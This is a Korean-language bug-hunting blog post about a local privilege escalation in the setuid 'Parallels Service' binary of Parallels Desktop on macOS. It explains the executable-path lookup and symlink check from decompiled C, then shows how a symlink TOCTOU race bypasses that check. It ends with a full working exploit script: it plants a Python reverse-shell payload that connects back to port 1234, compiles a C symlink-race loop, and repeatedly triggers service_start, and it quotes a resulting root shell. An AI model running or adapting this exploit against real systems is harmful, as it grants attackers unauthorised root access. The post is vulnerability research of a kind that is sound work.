---
layout: post
title: "Parallels Host LPE 날먹하기"
author: "say2"
tags: [parallels,bughunting]
categories: [Hacking,Bughunting]
---


시간과 마음이 살짝 붕떠서 블로그나 관리하려고 찾아와서 쓰는 글이다.

작년 5월쯤 찾은 오래된 버그이지만, 버그를 찾을때 상황이 재밌었어서 기억에 많이 남는 버그이다. 

뭐 특별한건 없고, 남자친구 훈련소 마중하려고 기다리면서 끄적거리다가 찾았다.

버그는 그냥 노트북에 아래 커맨드를 실행해보는것으로 시작되었다. 

```bash
➜ find /Applications -perm -4000
...
/Applications/Parallels Desktop.app/Contents/MacOS/prl_update_helper
/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service
```	

그냥 setuid바이너리가 있나 하고 커맨드를 입력해봤는데, 있었다.(단순한 접근방법은 의외로 잘 먹힌다.) 

이중 `Parallels Service` 를 분석해보았다. 

이 친구는 parallels 에 필요한 서비스들과 kernel extension을 로드하는 역할을 하는 바이너리였다. 

m1 mac의 경우에는 서비스들만 로드를 하고, x64 mac의 경우에는 kernel extension까지 로드를 한다. (따라서 취약점으로 x64에서는 kernel code execution까지 가능하다)

이 녀석이 서비스와 커널을 로드하는 방식은 간단하다. binary에 script가 텍스트로 박혀있고, binary상에서는 그냥 필요한 path정도만 찾아서 script에 인자로 넘겨주는 형태이다.(기억이 가물가물한데 그랬다.)

`/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service argv[1]` 형태로 실행시키면 스크립트 argv를 이런식으로 넘겨준다. 

`./script.sh argv[1] Application_path`

`argv[1]`에는 `service_start`, `service_stop` 과 같이 서비스 동작과 관련된 커맨드가 들어가고 `Application_path` 는 해당 바이너리에서 Application path(`/Applications/Parallels Desktop.app/` 를 동적으로 찾아서 `script.sh`의 argv로 넘겨준다. 

Application_path를 찾는 이유는 `Parallels Service`가 로드해야할 service binary(prl_naptd 등)와 kernel extension을 Applicaiton_path로 부터 상대경로로 찾아가기 떄문이다. 

그렇다면 이 Application_path를 어떤식으로 `Parallels Service` 바이너리가 찾는지가 궁금하다. 이 path를 조작할 수 있다면, 내가 조작할 수 있는 경로에 있는 binary를 service로 생각하여 root권한으로 실행될 수 있음을 의미한다. (혹은 x64에서는 내 kernel extension파일을 로드시킬 수도 있다)

아래 코드가 Application_path를 찾는 함수이다. 


```c
__int64 sub_100005BB0()
{
  ...

  bufsize[0] = 0;
  if ( _NSGetExecutablePath(0LL, bufsize) != -1 )
    return 0LL;
  v2 = (char *)malloc(bufsize[0]);
  if ( !v2 )
    return 0LL;
  v3 = v2;
  if ( _NSGetExecutablePath(v2, bufsize) )
    return 0LL;
  v4 = dirname(v3);
  if ( !v4 )
    return 0LL;
  v5 = v4;
  v6 = strlen(v4);
  v7 = (char *)calloc(1uLL, v6 + 7);
  if ( !v7 )
    return 0LL;
  v8 = v7;
  strcpy(v7, v5);
  strcpy(&v8[strlen(v5)], "/../..");
  v0 = realpath_DARWIN_EXTSN(v8, 0LL);
  free(v8);
  return v0;
}
```

`NSGetExecutablePath`라는 함수를 이용해서 경로를 찾아내는데, 해당 함수는 Mac에서 현재 실행된 바이너리의 경로를 가져올때 쓰인다. 

즉 위 함수는 바이너리 위치가 `/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service` 이기 때문에 바이너리의 path를 통해서 상대경로로 Application_path인  `/Applications/Parallels Desktop.app` 을 찾으려는 의도로 보여진다. 

NSGetExecutablePath의 경우에는 apple의 문서에 따르면
```Note that _NSGetExecutablePath() will return "a path" to the executable not a "real path" to the executable.```

즉, symbolic link를 사용하면 실제 경로가 아니라 symbolic link의 경로를 가져오게 된다. 그래서 위의 함수는 symoblic link로 Application_path를 조작할 수 있다. 

하지만 바이너리의 초반에 다음과 같은 함수가 있었다. 


```c
__int64 sub_100006650()
{
...

  bufsize[0] = 0;
  if ( _NSGetExecutablePath(0LL, bufsize) == -1
    && (v2 = (char *)malloc(bufsize[0])) != 0LL
    && (v3 = v2, !_NSGetExecutablePath(v2, bufsize)) )
  {
    sympath = dirname(v3);
    free(v3);
    if ( sympath )
    {
      v5 = open("/Library/Preferences/Parallels/parallels-desktop.loc", 0);
      if ( v5 == -1 )
      {
        ...
      }
      else
      {
        v6 = v5;
        v0 = sub_100006470(v5, bufsize, 1024LL);
        close(v6);
        if ( v0 )
          return v0;
        if ( (unsigned int)snprintf(realpath, 0x400uLL, "%s/Contents/MacOS", (const char *)bufsize) < 0x400 )
          return (unsigned int)compare_100006590((__int64)sympath, (__int64)realpath);
          ...

}
```

역시 `NSGetExecutablePath`를 통해서 현재경로를 가져온 뒤에, `/Library/Preferences/Parallels/parallels-desktop.loc`파일에 저장되어있는 경로랑 비교를 해서 같지 않으면 종료시켜버린다. (이렇게 할거면 그냥 `NSGetExecutablePath`를 쓰지 않고 해당 파일의 경로를 그대로 쓰는게 낫지 않나 싶다.)

```
➜  parallels cat /Library/Preferences/Parallels/parallels-desktop.loc
/Applications/Parallels Desktop.app%
```

즉, symbolic link를 썼는지 검사하는 함수인 듯하다.

조심스럽게 추측해보자면, 위와 같이 symbolic link를 이용해서 lpe하는 취약점이 존재했었고 이 함수는 그 취약점에 대한 패치가 아니었나 싶다. 

재밌는건 해당 함수(sub_100006650)와 위의 Applicaiton path를 가져오는 함수(sub_100005BB0)에서 각각 `NSGetExecutablePath`함수를 사용한다는 것이다. 

여기서 symbolic링크로 TOC TOU를 생각해볼 수 있다. 

`sub_100006650` 에서는 sym->/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service

`sub_100005BB0` 에서는 sym->/tmp/xxxx

로 만든다면 위의 symbolic link check함수를 우회할 수 있다. 

symbolic link를 바꿔줌으로써 race condition을 만들면 된다. 

당시에 코드를 왜 이렇게 짰는지 모르겠는데, 급하게 코드짜서 훈련소를 갔어야 했던것 같다.

```python
#!/usr/bin/python3
import os
import time
'''
➜  tmp nc -l 1234

The default interactive shell is now zsh.
To update your account to use zsh, please run `chsh -s /bin/zsh`.
For more details, please visit https://support.apple.com/kb/HT208050.
bash-3.2# id
id
uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)

if x86_64 arch, it can be kernel code execution 
'''

try:
	os.makedirs("/tmp/d1/d2")
	os.symlink("/Applications/Parallels Desktop.app/Contents/MacOS/Parallels Service","/tmp/d1/d2/hello")
	os.makedirs("/tmp/Contents/MacOS")
except:
	pass
rev_shell=b"export RHOST=\"127.0.0.1\";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
open("/tmp/Contents/MacOS/prl_net_start",'wb').write(rev_shell)

race_code=b'''#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdio.h>
int main(){
	char *path="/tmp/d1/d2/dd";
	int err;
	while(1){
		// unlink(path);
		err=symlink("/Applications/Parallels Desktop.app/Contents/MacOS/",path);
		unlink(path);
		err = symlink("/tmp/d1/d2",path);
		unlink(path);		
	}
}'''

open("/tmp/race.c","wb").write(race_code)
os.system("gcc -o /tmp/race /tmp/race.c;/tmp/race &")
time.sleep(0.5)
while(1):
	os.system("/tmp/d1/d2/dd/hello service_start")
```

왜 이런 취약점이 2021년까지 있었는지는 모르겠지만,

취약점이 쉬운만큼 아직까지는 parallels의 보안이 강하지 않음을 느낀다. 훌륭한 맥용 hypervisor임은 틀림없지만 보안성에 대해서는 좀 더 신경쓸 필요가 있어보인다.
